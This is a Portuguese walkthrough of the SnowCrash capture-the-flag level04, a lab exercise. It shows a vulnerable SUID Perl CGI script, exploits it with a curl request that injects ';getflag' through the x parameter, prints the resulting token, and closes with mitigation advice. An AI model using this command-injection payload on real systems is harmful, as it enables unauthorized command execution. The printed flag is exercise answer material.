# SnowCrash — Level04 Walkthrough (Metodologia)

## Objetivo

Neste nível, o objetivo é explorar um **script Perl SUID vulnerável a Command Injection via CGI parameter**.

O exercício ensina:

- funcionamento de scripts CGI
- uso da função `param()` em Perl
- execução de comandos com backticks
- command injection
- exploração via HTTP request
- impacto de scripts SUID inseguros

---

## Arquivo disponível

Listando o diretório:

```bash
ls -l
```

Resultado:

```
-rwsr-sr-x 1 flag04 level04.pl
```

O `s` nas permissões indica que o script executa com permissões do usuário **flag04**.

---

## Analisando o script

Executamos:

```bash
cat level04.pl
```

Conteúdo:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

---

## Entendimento do funcionamento

O script:

1. recebe um parâmetro chamado `x`
2. armazena em `$y`
3. executa `echo $y` utilizando backticks: `` `echo $y` ``

Backticks em Perl executam comandos no shell.

Ou seja: qualquer valor enviado em `x` será executado como comando.

---

## Identificação da vulnerabilidade

Trecho vulnerável:

```perl
print `echo $y 2>&1`;
```

Como `$y` vem de `param("x")`, o usuário controla completamente o comando executado.

Isso caracteriza: **Command Injection**

---

## Forma de entrada do parâmetro

O script usa `param("x")`, que recebe input via HTTP:

```
http://localhost:4747/?x=valor
```

O comentário no código confirma:

```perl
# localhost:4747
```

indicando execução como CGI script via Apache.

---

## Exploração da vulnerabilidade

Para executar comandos adicionais usamos `;`, que permite concatenar comandos no shell.

Payload:

```
;getflag
```

Como `;` deve ser codificado em URL:

```
; → %3B
```

Executamos:

```bash
curl 'http://localhost:4747/?x=%3Bgetflag'
```

---

## Resultado obtido

Saída:

```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

---

## Token obtido

**Token:** `ne2searoevaevoem4ov4ar8ap`

---

## Conceito aprendido

Este exercício demonstra: **Command Injection via CGI Parameter**

Código vulnerável típico:

```perl
print `echo $user_input`;
```

Usuário pode executar:

```
; comando
```

Exemplo:

```
echo hello; getflag
```

---

## Mitigação em ambiente real

Nunca executar comandos com input direto do usuário.

Evitar:

```perl
`echo $input`
```

Preferir:

```perl
system("echo", $input);
```

ou sanitizar entrada com:

- whitelist
- escaping
- input validation

Também evitar scripts CGI com privilégios elevados (SUID).

---

## Ferramentas utilizadas

| Ferramenta  | Função                       |
|-------------|------------------------------|
| `ls`        | listar arquivos              |
| `cat`       | ler script                   |
| `curl`      | enviar requisição HTTP       |
| `wget`      | alternativa ao curl          |
| `param()`   | leitura de parâmetro CGI     |
| backticks   | execução de comandos shell   |
| `getflag`   | obter token                  |

---

## Resultado final

**Usuário explorado:** `flag04`

**Token obtido:** `ne2searoevaevoem4ov4ar8ap`
